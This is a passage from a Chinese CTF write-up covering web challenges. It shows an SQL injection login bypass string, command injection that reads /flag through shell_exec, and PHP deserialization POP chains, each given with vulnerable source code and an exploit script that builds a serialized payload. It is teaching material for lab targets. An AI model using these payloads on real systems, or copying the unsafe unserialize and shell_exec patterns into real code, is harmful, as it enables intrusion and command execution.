single-quoted-string">'管理员邮箱或密码错误'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">unset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'captcha_code'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>用<code>||</code>代替<code>or</code>，剩余的注释掉，最终构造成：<code>email=a@a.a&#39; || &#39;1&#39;=&#39;1&#39;-- </code>,<code>pwd=aaa</code>，由于<code>pwd</code>进行了<code>md5</code>所以要将后面注释掉</p><h2 id="8-22"><a href="#8-22" class="headerlink" title="#8.22"></a>#8.22</h2><h3 id="一起吃豆豆"><a href="#一起吃豆豆" class="headerlink" title="一起吃豆豆"></a>一起吃豆豆</h3><p><code>index.js</code>里有一行<code>context.fillText(_LIFE ? atob(&quot;QmFzZUNURntKNV9nYW0zXzFzX2Vhc3lfdDBfaDRjayEhfQ==&quot;) : &#39;GAME OVER&#39;, this.x, this.y);，base64</code>解码得到<code>flag</code></p><h3 id="你听不到我的声音"><a href="#你听不到我的声音" class="headerlink" title="你听不到我的声音"></a>你听不到我的声音</h3><p>系统命令执行，不会直接显示，所以放到其他文件里再访问文件：<code>cmd=cat /flag &gt; ./1.txt</code></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">shell_exec</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="easy-ser"><a href="#easy-ser" class="headerlink" title="easy_ser"></a>easy_ser</h3><p>反序列化给我一种脑筋急转弯的感觉…</p><p>源码</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">re</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$chu0</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">chu0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token string double-quoted-string">"I can not believes!"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">chu0</span><span class="token operator">-></span><span class="token variable">$nononono</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">web</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$kw</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$dt</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"lalalla"</span><span class="token operator">.</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">kw</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"ALL Done!"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">pwn</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$dusk</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$over</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__get</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">dusk</span> <span class="token operator">!=</span> <span class="token string double-quoted-string">"gods"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"什么，你竟敢不认可?"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">over</span><span class="token operator">-></span><span class="token function">getflag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Misc</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$nothing</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">getflag</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"system('cat /flag');"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Crypto</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"happy happy happy!"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">getflag</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"you are over!"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$ser</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ser'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$ser</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>exp</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">re</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$chu0</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">chu0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token string double-quoted-string">"I can not believes!"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">chu0</span><span class="token operator">-></span><span class="token variable">$nononono</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">web</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$kw</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$dt</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"lalalla"</span><span class="token operator">.</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">kw</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"ALL Done!"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">pwn</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$dusk</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$over</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__get</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">dusk</span> <span class="token operator">!=</span> <span class="token string double-quoted-string">"gods"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"什么，你竟敢不认可?"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">over</span><span class="token operator">-></span><span class="token function">getflag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Misc</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$nothing</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">getflag</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"getflag"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$re</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">re</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$pwn</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">pwn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$web</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">web</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$misc</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Misc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$pwn</span><span class="token operator">-></span><span class="token property">dusk</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"gods"</span><span class="token punctuation">;</span><span class="token variable">$pwn</span><span class="token operator">-></span><span class="token property">over</span> <span class="token operator">=</span> <span class="token variable">$misc</span><span class="token punctuation">;</span><span class="token variable">$re</span><span class="token operator">-></span><span class="token property">chu0</span> <span class="token operator">=</span> <span class="token variable">$pwn</span><span class="token punctuation">;</span><span class="token variable">$web</span><span class="token operator">-></span><span class="token property">kw</span> <span class="token operator">=</span> <span class="token variable">$re</span><span class="token punctuation">;</span><span class="token variable">$res</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$web</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$res</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>最终构造：<code>O:3:&quot;web&quot;:2:&#123;s:2:&quot;kw&quot;;O:2:&quot;re&quot;:1:&#123;s:4:&quot;chu0&quot;;O:3:&quot;pwn&quot;:2:&#123;s:4:&quot;dusk&quot;;s:4:&quot;gods&quot;;s:4:&quot;over&quot;;O:4:&quot;Misc&quot;:2:&#123;s:7:&quot;nothing&quot;;N;s:4:&quot;flag&quot;;N;&#125;&#125;&#125;s:2:&quot;dt&quot;;N;&#125;</code></p><h3 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h3><h4 id="序列化-x2F-反序列化"><a href="#序列化-x2F-反序列化" class="headerlink" title="序列化&#x2F;反序列化"></a>序列化&#x2F;反序列化</h4><ul><li>**序列化<code>serialize()</code> ** <u><code>PHP</code> -&gt; 字符串</u>，将对象的状态以及它的类名和属性值编码为一个字符串，一般在输出的时候都会先编码后输出，以免遇到保护和私有类序列化后不可见字符丢失的问题<code>echo urlencode($serializedData)</code></li><li><strong>反序列化<code>unserialize()</code></strong> 将<u>序列化后的字符串 -&gt; <code>PHP</code> 对象</u>，将序列化的字符串解码，并转换回<code>PHP</code>对象</li><li>序列化的目的是方便数据的存储，常被用到缓存、<code>session</code>、<code>cookie</code>等地方</li><li>函数参数是一个类会调用它的<code>toString</code>方法</li></ul><h4 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h4><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> 当创建对象时触发，一般用于初始化对象，对变量赋初值<span class="token function">__sleep</span><span class="token punctuation">(</span><span class="token punctuation">)</span> 使用<span class="token function">serialize</span><span class="token punctuation">(</span><span class="token punctuation">)</span>时自动触发 <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span> 使用<span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token punctuation">)</span>时自动触发<span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> 当一个对象被销毁时触发<span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> 当一个类被当成字符串使用时触发<span class="token function">__invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span> 当尝试以调用函数的方式调用一个对象时触发<span class="token function">__call</span><span class="token punctuation">(</span><span class="token punctuation">)</span> 在对象上下文中调用不可访问的方法时触发 <span class="token function">__callStatic</span><span class="token punctuation">(</span><span class="token punctuation">)</span> 在静态上下文中调用不可访问的方法时触发 <span class="token function">__get</span><span class="token punctuation">(</span><span class="token punctuation">)</span> 用于从不可访问的属性读取数据<span class="token function">__set</span><span class="token punctuation">(</span><span class="token punctuation">)</span> 用于将数据写入不可访问的属性<span class="token function">__isset</span><span class="token punctuation">(</span><span class="token punctuation">)</span> 在不可访问的属性上调用<span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token punctuation">)</span>或<span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token punctuation">)</span>触发<span class="token function">__unset</span><span class="token punctuation">(</span><span class="token punctuation">)</span> 在不可访问的属性上使用<span class="token keyword">unset</span><span class="token punctuation">(</span><span class="token punctuation">)</span>时触发<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="垫刀之路06-pop-base-mini-moe"><a href="#垫刀之路06-pop-base-mini-moe" class="headerlink" title="垫刀之路06: pop base mini moe"></a>垫刀之路06: pop base mini moe</h3><p>源码</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">A</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// 注意 private 属性的序列化哦</span>    <span class="token keyword">private</span> <span class="token variable">$evil</span><span class="token punctuation">;</span>    <span class="token comment">// 如何赋值呢</span>    <span class="token keyword">private</span> <span class="token variable">$a</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$s</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">a</span><span class="token punctuation">;</span>        <span class="token variable">$s</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">evil</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">B</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token variable">$b</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function-definition function">__invoke</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$s</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">b</span><span class="token punctuation">;</span>        <span class="token variable">$s</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'data'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>     <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'data'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>     <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>直接利用<code>a</code>执行系统命令，直接<code>cat</code>没有回显，输出到其他文件中</p><p>exp</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">A</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$evil</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$a</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$s</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">a</span><span class="token punctuation">;</span>        <span class="token variable">$s</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">evil</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">B</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$b</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function-definition function">__invoke</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$s</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">b</span><span class="token punctuation">;</span>        <span class="token variable">$s</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">A</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token property">a</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'shell_exec'</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token property">evil</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'cat /flag > ./1.txt'</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>最终得到<code>O:1:&quot;A&quot;:2:&#123;s:4:&quot;evil&quot;;s:19:&quot;cat /flag &gt; ./1.txt&quot;;s:1:&quot;a&quot;;s:10:&quot;shell_exec&quot;;&#125;</code>，执行后访问<code>1.txt</code></p><h3 id="pop-moe"><a href="#pop-moe" class="headerlink" title="pop moe"></a>pop moe</h3><p>绕的脑子快打结了</p><p>源码</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">class000</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token variable">$payl0ad</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$what</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">check</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">check</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">payl0ad</span> <span class="token operator">===</span> <span class="token number">0</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'FAILED TO ATTACK'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">what</span><span class="token punctuation">;</span>        <span class="token variable">$a</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">class001</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token variable">$payl0ad</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$a</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">a</span><span class="token operator">-></span><span class="token property">payload</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">payl0ad</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">class002</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$sec</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__set</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span> <span class="token variable">$b</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token variable">$b</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">sec</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">dangerous</span><span class="token punctuation">(</span><span class="token variable">$whaattt</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$whaattt</span><span class="token operator">-></span><span class="token function">evvval</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">sec</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">class003</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$mystr</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">evvval</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__tostring</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">mystr</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>提示：题目容器创建方法是 <code>export FLAG=&#39;moectf&#123;...&#125;&#39; php-fpm -D</code></p><p>exp</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">class000</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$payl0ad</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$what</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">check</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">check</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">payl0ad</span> <span 